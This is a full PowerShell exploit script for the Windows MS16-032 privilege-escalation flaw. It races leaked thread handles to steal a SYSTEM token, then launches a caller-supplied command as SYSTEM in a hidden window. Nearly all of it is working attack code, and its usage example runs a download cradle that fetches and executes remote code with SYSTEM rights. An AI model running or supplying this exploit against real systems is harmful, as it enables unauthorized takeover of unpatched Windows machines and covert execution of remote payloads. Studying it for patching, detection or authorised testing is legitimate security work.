function Invoke-MS16032 {
<#
    .SYNOPSIS
        
        PowerShell implementation of MS16-032. The exploit targets all vulnerable
        operating systems that support PowerShell v2+. Credit for the discovery of
        the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
        
        Targets:
        
        * Win7-Win10 & 2k8-2k12 <== 32/64 bit!
        * Tested on x32 Win7, x64 Win8, x64 2k12R2
        
        Notes:
        
        * In order for the race condition to succeed the machine must have 2+ CPU
          cores. If testing in a VM just make sure to add a core if needed mkay.
        * The exploit is pretty reliable, however ~1/6 times it will say it succeeded
          but not spawn a shell. Not sure what the issue is but just re-run and profit!
        * Want to know more about MS16-032 ==>
          https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html

    .DESCRIPTION

        Author: Ruben Boonen (@FuzzySec)
        Blog: http://www.fuzzysecurity.com/
        License: BSD 3-Clause
        Required Dependencies: PowerShell v2+
        Optional Dependencies: None
        E-DB Note: Source ~ https://twitter.com/FuzzySec/status/723254004042612736

        EDIT: This script has been edited to include a parameter for custom commands and
        also hides the spawned shell. Many comments have also been removed and echo has
        moved to Write-Verbose. The original can be found at:
            https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
        
    .EXAMPLE

        C:\PS> Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"

        Description
        -----------
        Will run the iex download cradle as SYSTEM

#>
    [CmdletBinding()]
    param(

        [Parameter(Position=0,Mandatory=$True)]
        [String]
        $Command
    )

    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct SQOS
    {
        public int Length;
        public int ImpersonationLevel;
        public int ContextTrackingMode;
        public bool EffectiveOnly;
    }
    
    public static class Advapi32
    {
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool CreateProcessWithLogonW(
            String userName,
            String domain,
            String password,
            int logonFlags,
            String applicationName,
            String commandLine,
            int creationFlags,
            int environment,
            String currentDirectory,
            ref  STARTUPINFO startupInfo,
            out PROCESS_INFORMATION processInformation);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool SetThreadToken(
            ref IntPtr Thread,
            IntPtr Token);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenThreadToken(
            IntPtr ThreadHandle,
            int DesiredAccess,
            bool OpenAsSelf,
            out IntPtr TokenHandle);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle, 
            int DesiredAccess,
            ref IntPtr TokenHandle);
            
        [DllImport("advapi32.dll", SetLastError=true)]
        public extern static bool DuplicateToken(
            IntPtr ExistingTokenHandle,
            int SECURITY_IMPERSONATION_LEVEL,
            ref IntPtr DuplicateTokenHandle);
    }
    
    public static class Kernel32
    {
        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();
    
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentProcess();
    
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr GetCurrentThread();
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern int GetThreadId(IntPtr hThread);
        
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int GetProcessIdOfThread(IntPtr handle);
        
        [DllImport("kernel32.dll",SetLastError=true)]
        public static extern int SuspendThread(IntPtr hThread);
        
        [DllImport("kernel32.dll",SetLastError=true)]
        public static extern int ResumeThread(IntPtr hThread);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool TerminateProcess(
            IntPtr hProcess,
            uint uExitCode);
    
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CloseHandle(IntPtr hObject);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool DuplicateHandle(
            IntPtr hSourceProcessHandle,
            IntPtr hSourceHandle,
            IntPtr hTargetProcessHandle,
            ref IntPtr lpTargetHandle,
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwOptions);
    }
    
    public static class Ntdll
    {
        [DllImport("ntdll.dll", SetLastError=true)]
        public static extern int NtImpersonateThread(
            IntPtr ThreadHandle,
            IntPtr ThreadToImpersonate,
            ref SQOS SecurityQualityOfService);
    }
"@
    
    function Get-ThreadHandle {
        $StartupInfo = New-Object STARTUPINFO
        $StartupInfo.dwFlags = 0x00000100
        $StartupInfo.hStdInput = [Kernel32]::GetCurrentThread()
        $StartupInfo.hStdOutput = [Kernel32]::GetCurrentThread()
        $StartupInfo.hStdError = [Kernel32]::GetCurrentThread()
        $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
        
        $ProcessInfo = New-Object PROCESS_INFORMATION
        $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
        
        $CallResult = [Advapi32]::CreateProcessWithLogonW(
            "user", "domain", "pass",
            0x00000002, "C:\Windows\System32\cmd.exe", "",
            0x00000004, $null, $GetCurrentPath,
            [ref]$StartupInfo, [ref]$ProcessInfo)
        
        $lpTargetHandle = [IntPtr]::Zero
        $CallResult = [Kernel32]::DuplicateHandle(
            $ProcessInfo.hProcess, 0x4,
            [Kernel32]::GetCurrentProcess(),
            [ref]$lpTargetHandle, 0, $false,
            0x00000002)
        
        $CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
        $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
        $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
        
        $lpTargetHandle
    }
    
    function Get-SystemToken {
        Write-Verbose "`n[?] Trying thread handle: $Thread"
        Write-Verbose "[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread))).ProcessName)"
    
        $CallResult = [Kernel32]::SuspendThread($Thread)
        if ($CallResult -ne 0) {
            Write-Verbose "[!] $Thread is a bad thread, moving on.."
            Return
        } Write-Verbose "[+] Thread suspended"
        
        Write-Verbose "[>] Wiping current impersonation token"
        $CallResult = [Advapi32]::SetThreadToken([ref]$Thread, [IntPtr]::Zero)
        if (!$CallResult) {
            Write-Verbose "[!] SetThreadToken failed, moving on.."
            $CallResult = [Kernel32]::ResumeThread($Thread)
            Write-Verbose "[+] Thread resumed!"
            Return
        }
        
        Write-Verbose "[>] Building SYSTEM impersonation token"
        $SQOS = New-Object SQOS
        $SQOS.ImpersonationLevel = 2
        $SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS)
        $CallResult = [Ntdll]::NtImpersonateThread($Thread, $Thread, [ref]$sqos)
        if ($CallResult -ne 0) {
            Write-Verbose "[!] NtImpersonateThread failed, moving on.."
            $CallResult = [Kernel32]::ResumeThread($Thread)
            Write-Verbose "[+] Thread resumed!"
            Return
        }
    
        $script:SysTokenHandle = [IntPtr]::Zero
        $CallResult = [Advapi32]::OpenThreadToken($Thread, 0x0006, $false, [ref]$SysTokenHandle)
        if (!$CallResult) {
            Write-Verbose "[!] OpenThreadToken failed, moving on.."
            $CallResult = [Kernel32]::ResumeThread($Thread)
            Write-Verbose "[+] Thread resumed!"
            Return
        }
        
        Write-Verbose "[?] Success, open SYSTEM token handle: $SysTokenHandle"
        Write-Verbose "[+] Resuming thread.."
        $CallResult = [Kernel32]::ResumeThread($Thread)
    }
    
    $ms16032 = @"
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]
"@
    
    $ms16032
    
    Write-Verbose "`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
    if ($([System.Environment]::ProcessorCount) -lt 2) {
        "[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"
        Return
    }
    
    $ThreadArray = @()
    $TidArray = @()
    
    Write-Verbose "[>] Duplicating CreateProcessWithLogonW handles.."
    for ($i=0; $i -lt 500; $i++) {
        $hThread = Get-ThreadHandle
        $hThreadID = [Kernel32]::GetThreadId($hThread)
        if ($TidArray -notcontains $hThreadID) {
            $TidArray += $hThreadID
            if ($hThread -ne 0) {
                $ThreadArray += $hThread
            }
        }
    }
    
    if ($($ThreadArray.length) -eq 0) {
        "[!] No valid thread handles were captured, exiting!"
        Return
    } else {
        Write-Verbose "[?] Done, got $($ThreadArray.length) thread handle(s)!"
        Write-Verbose "`n[?] Thread handle list:"
    }
    
    Write-Verbose "`n[*] Sniffing out privileged impersonation token.."
    foreach ($Thread in $ThreadArray){
    
        Get-SystemToken
        
        Write-Verbose "`n[*] Sniffing out SYSTEM shell.."
        Write-Verbose "`n[>] Duplicating SYSTEM token"
        $hDuplicateTokenHandle = [IntPtr]::Zero
        $CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle)
        
        Write-Verbose "[>] Starting token race"
        $Runspace = [runspacefactory]::CreateRunspace()
        $StartTokenRace = [powershell]::Create()
        $StartTokenRace.runspace = $Runspace
        $Runspace.Open()
        [void]$StartTokenRace.AddScript({
            Param ($Thread, $hDuplicateTokenHandle)
            while ($true) {
                $CallResult = [Advapi32]::SetThreadToken([ref]$Thread, $hDuplicateTokenHandle)
            }
        }).AddArgument($Thread).AddArgument($hDuplicateTokenHandle)
        $AscObj = $StartTokenRace.BeginInvoke()
        
        Write-Verbose "[>] Starting process race"
        $SafeGuard = [diagnostics.stopwatch]::StartNew()
        while ($SafeGuard.ElapsedMilliseconds -lt 10000) {
            $StartupInfo = New-Object STARTUPINFO
            # 2 lines added to hide window
            $StartupInfo.dwFlags = 0x00000001
            $StartupInfo.wShowWindow = 0x00000000
            $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size

            $ProcessInfo = New-Object PROCESS_INFORMATION
            
            $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
            
            $CallResult = [Advapi32]::CreateProcessWithLogonW(
                "user", "domain", "pass",
                0x00000002, "$Env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe", " -command $Command",
                0x00000004, $null, $GetCurrentPath,
                [ref]$StartupInfo, [ref]$ProcessInfo)
                
            $hTokenHandle = [IntPtr]::Zero
            $CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
            if (!$CallResult) {
                "`n[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
                $CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
                $StartTokenRace.Stop()
                $SafeGuard.Stop()
                Return
            }
                
            $CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
            $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
            $CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
        }
        
        $StartTokenRace.Stop()
        $SafeGuard.Stop()
    }
}
